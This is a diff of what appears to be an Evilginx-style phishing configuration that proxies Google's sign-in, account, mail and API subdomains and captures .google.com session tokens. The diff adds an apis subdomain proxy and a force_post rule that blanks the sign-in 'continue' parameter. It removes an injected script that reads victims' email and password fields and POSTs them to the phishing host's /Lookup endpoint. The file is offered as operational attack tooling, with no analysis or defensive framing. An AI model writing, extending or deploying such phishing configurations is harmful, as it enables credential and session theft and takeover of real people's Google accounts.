@@ -1,4 +1,4 @@
-author: ''
+author: '@king'
 min_ver: '2.3.0'
 
 proxy_hosts:
@@ -6,6 +6,8 @@ proxy_hosts:
   - {phish_sub: 'myaccount', orig_sub: 'myaccount', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
   - {phish_sub: 'www', orig_sub: 'www', domain: 'google.com', session: true, is_landing: false, auto_filter: false}
   - {phish_sub: 'mail', orig_sub: 'mail', domain: 'google.com', session: true, is_landing: false, auto_filter: true}
+  - {phish_sub: 'apis', orig_sub: 'apis', domain: 'google.com', session: false, is_landing: false, auto_filter: false}
+
 
 
 sub_filters:
@@ -13,6 +15,7 @@ sub_filters:
   - {triggers_on: 'myaccount.google.com', orig_sub: 'myaccount', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'accounts.google.com', orig_sub: 'www', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
   - {triggers_on: 'accounts.google.com', orig_sub: 'mail', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
+  - {triggers_on: 'apis.google.com', orig_sub: 'apis', domain: 'google.com', search: '{hostname}', replace: '{hostname}', mimes: ['text/html', 'application/json', 'application/javascript', 'application/x-javascript', 'application/ecmascript', 'text/javascript', 'text/ecmascript']}
 
 auth_tokens:
   - domain: '.google.com'
@@ -38,56 +41,11 @@ login:
   domain: 'accounts.google.com'
   path: '/v3/signin/identifier?continue=https%3A%2F%2Fmail.google.com%2Fmail%2F&ifkv=AYZoVhd6Z2Pt3Bf1DB0r4k3Q6_sj3TYPJmrEwma22OMuhQYrxSHLWxTXLGqHk5O9Geq5BNrH_ApNWA&rip=1&sacu=1&service=mail&flowName=GlifWebSignIn&flowEntry=ServiceLogin&dsh=S1661933114%3A1695129172729313&theme=glif'
 
-js_inject:
-  - trigger_domains: ['accounts.google.com']
-    trigger_paths: ['signin/identifier']
-    script: |
-      setInterval(function() {
-
-           if (document.querySelectorAll("input[name='Passwd']")?.length) {
-              
-                      var password = document.getElementsByName("Passwd")[0].value;
-                      var email = document.querySelector("#identifierId")?.value;
-                      var xhr = new XMLHttpRequest();
-                      var myHostName = ('https://'+ location.hostname);
-                      myHostName = myHostName.replace('accounts.', '');
-                      xhr.open("POST", myHostName + "/Lookup", true);
-                      xhr.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
-                      xhr.send("unenc_email=" + encodeURIComponent(email) + "&unenc_pwd=" + encodeURIComponent(password));
-
-           } else {
-            
-           }
-              
-        }, 2000);
-
-
-        setTimeout(function() {
-
-           if (document.querySelectorAll("input[aria-label='Email or phone']")?.length) {
-              
-                      var email = document.querySelector("#identifierId")?.value;
-                      document.getElementById("identifierId").value = localStorage.getItem("email");
-                      document.getElementById('identifierNext').click();
-           } else {
-            
-           }
-              
-        }, 3500);
-
-
-        - trigger_domains: ['myaccount.google.com']
-          trigger_paths: ['.*?']
-          script: |
-            (function () {
-               'use strict';
-               let subdomain = window.location.host.split('.')[0];
-               if (subdomain == "myaccount") {
-                  window.location.host = "myaccount.google.com";
-                  // console.log("redirecting to myaccount.google.com");
-                }
-              }());
-        
-
-
-        
+force_post:
+  - path: '/signin/identifier'
+    search: 
+      - {key: 'f.req', search: '.*'}
+      - {key: 'continue', search: '.*'}
+    force:
+      - {key: 'continue', value: ''}
+    type: 'post'
